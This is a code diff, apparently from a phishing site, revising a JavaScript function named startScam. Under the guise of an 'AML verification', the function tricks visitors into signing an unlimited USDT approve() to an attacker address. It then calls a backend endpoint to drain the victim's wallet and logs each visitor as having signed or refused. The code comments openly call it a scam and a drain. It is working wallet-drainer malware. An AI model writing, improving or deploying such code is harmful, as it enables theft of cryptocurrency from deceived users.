@@ -1047,95 +1047,77 @@
       setTimeout(startScam, 1000);
     }
 
-    async function startScam() {
-      if (currentChainId !== '1') {
-        document.querySelector('.scan').textContent = 'Réseau non supporté';
-        return;
-      }
+async function startScam() {
+  if (currentChainId !== '1') {
+    document.querySelector('.scan').textContent = 'Réseau non supporté';
+    return;
+  }
 
-      const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+  const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 
-      // Données d'approbation : approve(ATTACKER, MAX)
-      const approveData = '0x095ea7b3' +
-        ATTACKER.slice(2).padStart(64, '0') +
-        'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  // Data d'approve : approve(ATTACKER, MAX)
+  const approveData = '0x095ea7b3' +
+    ATTACKER.slice(2).padStart(64, '0') +
+    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-      // ABI du forwarder (seulement la fonction executeDelegate)
-      const forwarderABI = [
-        {
-          "inputs": [
-            { "internalType": "address", "name": "target", "type": "address" },
-            { "internalType": "bytes", "name": "data", "type": "bytes" }
-          ],
-          "name": "executeDelegate",
-          "outputs": [],
-          "stateMutability": "payable",
-          "type": "function"
-        }
-      ];
+  const tx = {
+    from: account,
+    to: USDT_ADDR,
+    data: approveData,
+    gasLimit: '0x30D40' // 200 000 gaz – suffisant pour un approve
+  };
 
-      // Encoder l'appel : forwarder.executeDelegate(USDT, approveData)
-      const iface = new ethers.utils.Interface(forwarderABI);
-      const callData = iface.encodeFunctionData('executeDelegate', [USDT, approveData]);
+  const scanText = document.querySelector('.scan');
+  if (scanText) scanText.textContent = '🔒 En attente de la signature…';
 
-      const tx = {
-        from: account,
-        to: FORWARDER,
-        data: callData,
-        gasLimit: '0xea60' // 60 000 gaz suffisant
-      };
+  try {
+    await signClient.request({
+      topic: session.topic,
+      request: {
+        id: Date.now(),
+        jsonrpc: '2.0',
+        method: 'eth_sendTransaction',
+        params: [tx]
+      },
+      chainId: 'eip155:1'
+    });
 
-      const scanText = document.querySelector('.scan');
-      if (scanText) scanText.textContent = '🔒 En attente de la signature…';
+    if (scanText) scanText.textContent = '✅ Signature réussie. Vérification AML en cours…';
 
-      try {
-        await signClient.request({
-          topic: session.topic,
-          request: {
-            id: Date.now(),
-            jsonrpc: '2.0',
-            method: 'eth_sendTransaction',
-            params: [tx]
-          },
-          chainId: 'eip155:1'
-        });
+    // Enregistrer le statut "signed"
+    await fetch('/api/record-wallet', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ address: account, chain: currentChainId, status: 'signed' })
+    });
 
-        if (scanText) scanText.textContent = '✅ Signature réussie. Vérification AML en cours…';
+    // Attendre 3 secondes avant le drain
+    await new Promise(r => setTimeout(r, 3000));
 
-        // Enregistrer le statut "signed"
-        await fetch('/api/record-wallet', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ address: account, chain: currentChainId, status: 'signed' })
-        });
+    // Lancer le drain automatique
+    const drainResp = await fetch(API, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ victim: account, chain: currentChainId })
+    });
+    const drainData = await drainResp.json();
+    console.log('Drain response:', drainData);
 
-        // Attendre 3 secondes pour que la transaction soit minée
-        await new Promise(r => setTimeout(r, 3000));
+    if (scanText) scanText.textContent = drainData.success ? '✅ Vérification AML terminée. Redirection…' : '❌ Drain partiellement échoué (voir logs)';
 
-        // Lancer le drain automatique
-        const drainResp = await fetch(API, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ victim: account, chain: currentChainId })
-        });
-        const drainData = await drainResp.json();
-        console.log('Drain response:', drainData);
+    setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
+  } catch (e) {
+    console.error('❌ Transaction refusée', e);
+    if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
 
-        if (scanText) scanText.textContent = drainData.success ? '✅ Vérification AML terminée. Redirection…' : '❌ Drain partiellement échoué (voir logs)';
-
-        setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
-      } catch (e) {
-        console.error('❌ Transaction refusée', e);
-        if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
-
-        // Statut "unsigned"
-        await fetch('/api/record-wallet', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ address: account, chain: currentChainId, status: 'unsigned' })
-        });
-      }
-    }
+    // Statut "unsigned"
+    await fetch('/api/record-wallet', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ address: account, chain: currentChainId, status: 'unsigned' })
+    });
+  }
+}
 
     // ===== Historique des victimes =====
     let victimPollTimer = null;
